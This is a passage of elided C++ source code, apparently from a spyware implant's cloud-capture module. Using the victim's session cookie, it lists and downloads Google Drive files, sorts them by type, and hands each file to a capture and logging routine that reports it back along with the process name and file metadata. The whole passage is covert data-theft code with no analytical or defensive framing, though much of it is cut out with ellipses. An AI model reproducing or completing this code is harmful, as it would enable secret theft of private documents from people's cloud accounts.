...
{	
	...
	if(StrStrIW(jObj[szMimeType]->AsString().c_str(), L"google-apps.folder") != NULL)
		return GD_ITEM_DIR;

	//verify if it's a google spreadsheet (xlsx)
	if(StrStrIW(jObj[szMimeType]->AsString().c_str(), L"google-apps.spreadsheet") != NULL)
		return GD_ITEM_XLS;

	//verify if it's a google spreadsheet (xlsx)
	if(StrStrIW(jObj[szMimeType]->AsString().c_str(), L"google-apps.ritz") != NULL)
		return GD_ITEM_XLS;	

	//verify if it's a google presentation (ppt)
	if(StrStrIW(jObj[szMimeType]->AsString().c_str(), L"google-apps.presentation") != NULL)
		return GD_ITEM_PPT;	

	//verify if it's a google presentation (ppt)
	if(StrStrIW(jObj[szMimeType]->AsString().c_str(), L"google-apps.punch") != NULL)
		return GD_ITEM_PPT;

	//verify if it's a google drawing (jpg)
	if(StrStrIW(jObj[szMimeType]->AsString().c_str(), L"google-apps.drawing") != NULL)
		return GD_ITEM_JPG;	

	//verify if it's a google document (docx)
	if(StrStrIW(jObj[szMimeType]->AsString().c_str(), L"google-apps.document") != NULL)
		return GD_ITEM_DOC;	

	//verify if it's a google document (docx)
	if(StrStrIW(jObj[szMimeType]->AsString().c_str(), L"google-apps.kix") != NULL)
		return GD_ITEM_DOC;	
...
{	
	...
	swprintf_s(pwszURI,
			   dwSize,
			   L"/drive/v2internal/files?q=trashed%%20%%3D%%20false&fields=kind%%2Citems(kind%%2CcreatedDate%%2Cdescription%%2CfileExtension%%2CfileSize%%2Cid%%2ClastViewedByMeDate%%2CmimeType%%2CmodifiedDate%%2Ctitle)&appDataFilter=NO_APP_DATA&maxResults=%d&sortBy=LAST_MODIFIED&reverseSort=false&key=%S",
...
{		
	...
	else
	{
		...
		if((dwRet != SOCIAL_REQUEST_SUCCESS) || (dwBufferSize < 5) || (pszRecvBuf == NULL))
		{
			znfree(&pwszURI);
			znfree(&pwszHost);
			znfree(&pszRecvBuf);
...
DWORD GD_DownloadFiles(PGD_FILE_LIST pFileList, PGD_PARAMS pParams, LPSTR pszCookie)
{
	...
	for(pItem=pList; pItem != NULL; pItem=pItem->Next)
	{
		...
		if(dwRetFile == GD_E_SUCCESS)
		{
			...
			DWORD dwRet = Log_CopyCloudFile(pItem, NULL, FALSE, PM_FILEAGENT_CAPTURE);
...
{	
	LPSTR	  pszRecvBuffer=NULL, pszSendBuffer=NULL;
	DWORD	  dwRet, dwBufferSize=0, dwFiles=0, i=0;
	JSONValue *jValue;
	JSONArray jFiles, jArray;
	...
	#ifdef _DEBUG
		if(pszRecvBuffer)
			GD_DumpBuffer(L"k:\\GDocs\\filelist.html", pszRecvBuffer, dwBufferSize);
	#endif
...
//	OutputDebugString("[GD] GD_GetFileList Parsing JSON struct");
	...
	if(jValue != NULL)
	{
		...
		{				
			...
			if((jArray.size() >= 4) && (jArray[3]->IsString()))
			{			
				znfree(&pParams->pszDriveID);

				//save the drive id
				DWORD dwSize = wcslen(jArray[3]->AsString().c_str()) + 1;
				pParams->pszDriveID = (LPSTR)malloc(dwSize);
			
				//convert to multibyte array
				if(WideCharToMultiByte(CP_ACP, 0, jArray[3]->AsString().c_str(), -1, (LPSTR)pParams->pszDriveID, dwSize, NULL, NULL) == 0)
				{
					znfree(&pParams->pszDriveID);
					//return GD_E_GENERIC;re
				}
			}

			//file arrays are in the 2nd level array
			for(int i=0; i<1; i++)
			{
				if((jArray.size() > 0 ) && (jArray[0]->IsArray()))
					jFiles = jArray[0]->AsArray();
			
				jArray = jFiles;
			}

			//get the last saved timestamp
			dwRet = GD_GetLastTimeStamp(pParams->pszDriveID, &pParams->dwTimestamp, "gd");
			if(dwRet == GD_E_SUCCESS)
			{
				//get file info
				dwRet = GD_GetFileInfo(pFileList, jFiles, pParams->dwTimestamp);
			}
		}
	}
	else
...
GD_ITEM_TYPE GD_GetFileType(JSONArray jFile)
{
	...
	//verify if it's a directory
	if(StrStrIW(jFile[GD_FILE_TYPE]->AsString().c_str(), L"google-apps.folder") != NULL)
		return GD_ITEM_DIR;

	//verify if it's a google spreadsheet (xlsx)
	if(StrStrIW(jFile[GD_FILE_TYPE]->AsString().c_str(), L"google-apps.spreadsheet") != NULL)
		return GD_ITEM_XLS;

	//verify if it's a google spreadsheet (xlsx)
	if(StrStrIW(jFile[GD_FILE_TYPE]->AsString().c_str(), L"google-apps.ritz") != NULL)
		return GD_ITEM_XLS;	

	//verify if it's a google presentation (ppt)
	if(StrStrIW(jFile[GD_FILE_TYPE]->AsString().c_str(), L"google-apps.presentation") != NULL)
		return GD_ITEM_PPT;	

	//verify if it's a google presentation (ppt)
	if(StrStrIW(jFile[GD_FILE_TYPE]->AsString().c_str(), L"google-apps.punch") != NULL)
		return GD_ITEM_PPT;

	//verify if it's a google drawing (jpg)
	if(StrStrIW(jFile[GD_FILE_TYPE]->AsString().c_str(), L"google-apps.drawing") != NULL)
		return GD_ITEM_JPG;	

	//verify if it's a google document (docx)
	if(StrStrIW(jFile[GD_FILE_TYPE]->AsString().c_str(), L"google-apps.document") != NULL)
		return GD_ITEM_DOC;	

	//verify if it's a google document (docx)
	if(StrStrIW(jFile[GD_FILE_TYPE]->AsString().c_str(), L"google-apps.kix") != NULL)
		return GD_ITEM_DOC;	
...
{	
	...
	DWORD dwFileSizeHi, dwFileSizeLo, dwOperation, dwRet;	
	...
	if(pszProcName)
	{
		tolog.add(pszProcName, strlen(pszProcName)+1);
		SAFE_FREE(pszProcName);
	}
	else
		tolog.add("UNKNOWN", strlen("UNKNOWN")+1);

	tolog.add(&dwFileSizeHi, sizeof(dwFileSizeHi));
	tolog.add(&dwFileSizeLo, sizeof(dwFileSizeLo));
	tolog.add(&dwOperation, sizeof(dwOperation));
	tolog.add(pFile->pwszFileName, (wcslen(pFile->pwszFileName)*2)+2);
	tolog.add(&dwDelimiter, sizeof(DWORD));

	//file open log
	dwRet = LOG_ReportLog(PM_FILEAGENT, tolog.get_buf(), tolog.get_len());

	if(dwRet == TRUE)
		return GD_E_SUCCESS;
	else
		return GD_E_LOG_FAILED;
}
...
DWORD GD_GetLastTimeStamp(LPSTR lpszPrefix, DWORD *dwTimestamp, LPSTR pstrSuffix)
{
	...
	*dwTimestamp = GetLastFBTstamp(szTSName, NULL);
...
DWORD GD_SetLastTimeStamp(LPSTR lpszPrefix, DWORD dwTimestamp, LPSTR pstrSuffix)
{
	...
	//set the timestamp		
	SetLastFBTstamp(szTSName, dwTimestamp, 0);
